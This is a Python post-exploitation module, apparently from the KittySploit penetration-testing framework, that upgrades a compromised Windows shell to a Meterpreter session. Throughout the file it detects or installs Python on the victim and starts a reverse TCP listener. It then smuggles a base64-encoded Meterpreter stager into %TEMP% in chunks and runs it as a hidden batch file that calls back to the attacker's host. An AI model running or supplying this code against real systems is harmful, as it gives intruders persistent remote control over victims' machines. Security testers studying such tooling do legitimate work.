#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Upgrade Shell to Meterpreter (Windows).
Uses the existing shell session to run a Python Meterpreter stager in background.
Starts the Meterpreter listener automatically, then launches the stager.
Auto-detects Python on the target (python, py, python3); if not found, installs
embeddable Python via PowerShell (download + extract) and uses it.
"""

from kittysploit import *
from core.framework.failure import ProcedureError, FailureType
from core.framework.enums import Platform
import importlib
import re
import time


# Regex: "Python" + version number (e.g. Python 3.12.1 or Python 3.8.0)
_PY_VERSION_RE = re.compile(r"Python\s+\d+\.\d+", re.I)


class Module(Post):
    __info__ = {
        "name": "Upgrade Shell to Meterpreter (Windows)",
        "description": "Launch a Meterpreter stager from a Windows shell. Auto-detects or installs Python; starts listener automatically.",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.SHELL],
        "references": [],
    }

    session_id = OptString("", "Session ID (shell)", True)
    lhost = OptString("127.0.0.1", "Callback IP for the new Meterpreter session", True)
    lport = OptPort(4444, "Callback port for the new Meterpreter session", True)

    def _get_session_id_value(self) -> str:
        value = getattr(self, "session_id", "") or ""
        if hasattr(value, "value"):
            value = value.value
        return str(value or "").strip()

    def _is_shell_session(self) -> bool:
        sid = self._get_session_id_value()
        if not sid or not self.framework or not hasattr(self.framework, "session_manager"):
            return False
        session = self.framework.session_manager.get_session(sid)
        if not session:
            return False
        st = getattr(session, "session_type", "") or ""
        return str(st).lower() == SessionType.SHELL.value.lower()

    def check(self):
        """Verify we have a shell session and options are set."""
        if not self._get_session_id_value():
            return False
        if not self._is_shell_session():
            return False
        return True

    def _detect_python(self) -> str | None:
        """Try python, python.exe, py, python3, python3.exe on the target; return the first that works, or None."""
        # Use --version: no quotes, works in cmd and PowerShell; Python prints to stderr but shells often merge it
        candidates = ("python", "python.exe", "py", "py.exe", "python3", "python3.exe")
        for candidate in candidates:
            # Redirect stderr to stdout: Python prints version to stderr on Windows
            check_cmd = f"{candidate} --version 2>&1"
            out = self.cmd_execute(check_cmd)
            out = (out or "").strip()
            if re.search(r"not recognized|cannot find|is not recognized", out, re.I):
                continue
            if _PY_VERSION_RE.search(out):
                return candidate
        return None

    def _resolve_python_path(self, python_binary: str) -> str:
        """Resolve 'python' / 'py' etc. to full path on target so background process (start /b cmd /c) finds it."""
        if not python_binary:
            return python_binary
        # Already a path (from install_python or contains \ or /)
        if "\\" in python_binary or "/" in python_binary:
            return python_binary.strip()
        # Resolve via where (cmd) or Get-Command (PowerShell); new process won't inherit PATH the same way
        for cmd in (
            f'where {python_binary} 2>nul',
            f'powershell -NoP -Command "(Get-Command -Name {python_binary!r} -ErrorAction SilentlyContinue).Source"',
        ):
            out = self.cmd_execute(cmd)
            if not out:
                continue
            for line in (out or "").strip().splitlines():
                line = line.strip()
                if not line or re.search(r"not recognized|cannot find", line, re.I):
                    continue
                if ("python" in line.lower() and ".exe" in line.lower()) or line.endswith(".exe"):
                    return line
        return python_binary

    def _get_embed_python_path(self) -> str | None:
        """Find python.exe under %TEMP% (after install_python). Returns full path or None."""
        # install_python extracts to %TEMP% or same dir as zip; typical: python-3.12.1-embed-win32\python.exe
        find_cmd = (
            'powershell -NoP -Command '
            '"$t=[Environment]::GetFolderPath(\'LocalApplicationData\')+\'\\Temp\'; '
            '$e=Get-ChildItem -LiteralPath $t -Recurse -Filter python.exe -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName; '
            'if($e){Write-Output $e}"'
        )
        out = self.cmd_execute(find_cmd)
        path = (out or "").strip()
        if path and len(path) < 260 and ("python" in path.lower() and path.endswith(".exe")):
            return path
        # Fallback: echo %TEMP% then try known embed folder names
        temp_out = self.cmd_execute("echo %TEMP%")
        temp_dir = (temp_out or "").strip().rstrip("\\")
        if not temp_dir:
            return None
        for name in ("python.exe", "python-3.12.1-embed-win32\\python.exe", "python-3.11.7-embed-win32\\python.exe"):
            candidate = temp_dir + "\\" + name
            check = self.cmd_execute(f'if exist "{candidate}" (echo FOUND) else (echo NOTFOUND)')
            if "FOUND" in (check or ""):
                return candidate
        return None

    def _install_python_fallback(self) -> str | None:
        """Install embeddable Python via post module, then return path to python.exe."""
        if not self.framework or not hasattr(self.framework, "module_loader"):
            return None
        sid = self._get_session_id_value()
        # Check PowerShell (required for install_python)
        ps_check = self.cmd_execute('powershell -NoP -Command "Write-Output 1"')
        if not ps_check or "1" not in (ps_check or "").strip():
            if re.search(r"not recognized|cannot find", (ps_check or ""), re.I):
                return None
        mod = self.framework.module_loader.load_module(
            "post/shell/windows/manage/install_python", framework=self.framework
        )
        if not mod:
            return None
        mod.set_option("session_id", sid)
        print_info("Python not found. Installing embeddable Python (requires PowerShell)...")
        try:
            mod.run()
        except ProcedureError:
            raise
        except Exception as e:
            print_warning(f"Install Python module failed: {e}")
            return None
        return self._get_embed_python_path()

    def _load_payload_and_generate_command(self, python_binary: str) -> str:
        """Load Windows Python Meterpreter payload, set options, return the one-liner command."""
        try:
            mod_path = "modules.payloads.singles.cmd.windows.python_meterpreter_reverse_tcp"
            mod = importlib.import_module(mod_path)
            PayloadClass = getattr(mod, "Module", None)
            if not PayloadClass:
                raise ProcedureError(FailureType.Unknown, "Payload module has no Module class")
            payload = PayloadClass(framework=self.framework)
            lhost_val = self.lhost.value if hasattr(self.lhost, "value") else str(self.lhost)
            lport_val = int(self.lport.value if hasattr(self.lport, "value") else self.lport)
            payload.set_option("lhost", lhost_val)
            payload.set_option("lport", lport_val)
            payload.set_option("python_binary", python_binary)
            cmd = payload.generate()
            if not cmd or not isinstance(cmd, str):
                raise ProcedureError(FailureType.Unknown, "Payload did not return a command string")
            return cmd.strip()
        except ProcedureError:
            raise
        except Exception as e:
            raise ProcedureError(FailureType.Unknown, f"Failed to generate payload: {e}")

    def _start_meterpreter_listener(self, lhost_val: str, lport_val: int):
        """Load and start the Meterpreter reverse TCP listener in background. Returns listener instance or None."""
        if not self.framework or not hasattr(self.framework, "module_loader"):
            raise ProcedureError(FailureType.ConfigurationError, "Framework or module_loader not available")
        listener = self.framework.module_loader.load_module(
            "listeners/multi/meterpreter_reverse_tcp", framework=self.framework
        )
        if not listener:
            raise ProcedureError(FailureType.Unknown, "Could not load listeners/multi/meterpreter_reverse_tcp")
        listener.set_option("lhost", lhost_val)
        listener.set_option("lport", lport_val)
        if hasattr(listener, "session_platform"):
            listener.session_platform = Platform.WINDOWS
        result = listener.run(background=True)
        if result is not True:
            raise ProcedureError(FailureType.Unknown, "Failed to start Meterpreter listener")
        return listener

    def run(self):
        try:
            sid = self._get_session_id_value()
            if not sid:
                raise ProcedureError(FailureType.ConfigurationError, "Session ID is required")
            if not self._is_shell_session():
                raise ProcedureError(
                    FailureType.ConfigurationError,
                    "This module requires a shell session. Use 'sessions' to list and select one.",
                )

            lhost_val = self.lhost.value if hasattr(self.lhost, "value") else str(self.lhost)
            lport_val = int(self.lport.value if hasattr(self.lport, "value") else self.lport)

            print_status("Upgrading shell to Meterpreter...")
            print_info(f"Callback: {lhost_val}:{lport_val}")

            # Auto-detect Python on target (python, py, python3)
            print_info("Detecting Python on target...")
            python_binary = self._detect_python()
            if not python_binary:
                # Fallback: install embeddable Python via post module (requires PowerShell)
                python_binary = self._install_python_fallback()
            if not python_binary:
                raise ProcedureError(
                    FailureType.NotVulnerable,
                    "Python not found and could not install. "
                    "PowerShell is required for automatic install. "
                    "Run post/shell/windows/manage/install_python first, or install Python manually.",
                )
            # Resolve to full path so background stager (start /b cmd /c) finds python
            python_binary = self._resolve_python_path(python_binary)
            print_success(f"Using Python: {python_binary}")

            # Start the Meterpreter listener first so it is ready when the stager connects
            print_info("Starting Meterpreter listener...")
            listener = self._start_meterpreter_listener(lhost_val, lport_val)
            time.sleep(1.0)  # give listener time to bind

            print_info("Generating Python Meterpreter stager...")
            cmd = self._load_payload_and_generate_command(python_binary)

            # Windows CreateProcess command line limit ~8191 chars; payload base64 is huge -> chunked transfer
            import base64
            b64 = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
            temp_b64 = "[Environment]::GetFolderPath('LocalApplicationData')+'\\Temp\\p.b64'"
            chunk_size = 4000
            chunks = [b64[i : i + chunk_size] for i in range(0, len(b64), chunk_size)]

            # 1) Write base64 to %TEMP%\p.b64 in chunks (each command under 8191; single-quoted to avoid $ expansion)
            for i, chunk in enumerate(chunks):
                chunk_esc = chunk.replace("'", "''")
                if i == 0:
                    script = f"Set-Content -LiteralPath ({temp_b64}) -Value '{chunk_esc}' -NoNewline"
                else:
                    script = f"Add-Content -LiteralPath ({temp_b64}) -Value '{chunk_esc}' -NoNewline"
                script_esc = script.replace("'", "''")
                write_cmd = f"powershell -NoP -NonI -Command '{script_esc}'"
                self.cmd_execute(write_cmd)

            # 2) Decode p.b64 -> m.bat and run m.bat (short script, no payload in command)
            run_script = (
                "$b=[IO.File]::ReadAllText(" + temp_b64 + "); "
                "$p=[Environment]::GetFolderPath('LocalApplicationData')+'\\Temp\\m.bat'; "
                "[IO.File]::WriteAllText($p,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))); "
                "Start-Process -WindowStyle Hidden -FilePath cmd -ArgumentList '/c',$p"
            )
            run_script_esc = run_script.replace("'", "''")
            run_cmd = f"powershell -NoP -NonI -Command '{run_script_esc}'"

            print_info("Launching Meterpreter stager in background...")
            out = self.cmd_execute(run_cmd)

            # Wait for the stager to connect and the listener to create a session (timeout 60s)
            wait_timeout = 60
            print_info(f"Waiting for Meterpreter session (timeout {wait_timeout}s)...")
            if getattr(listener, "session_created_event", None) and listener.session_created_event.wait(timeout=wait_timeout):
                new_sid = getattr(listener, "created_session_id", None)
                if new_sid:
                    print_success("Meterpreter session opened.")
                    print_success(f"New session ID: {new_sid}")
                    print_info("Use 'sessions' to list and 'sessions interact <id>' to use the new Meterpreter session.")
                else:
                    print_success("Stager connected.")
            else:
                print_warning("Timeout waiting for Meterpreter connection.")
                if hasattr(listener, "shutdown") and callable(listener.shutdown):
                    listener.shutdown()
                    print_info("Listener stopped (port released).")
                print_info("If the stager was blocked (e.g. Defender), fix the block and run the module again.")

            return True

        except ProcedureError:
            raise
        except Exception as e:
            raise ProcedureError(FailureType.Unknown, str(e))
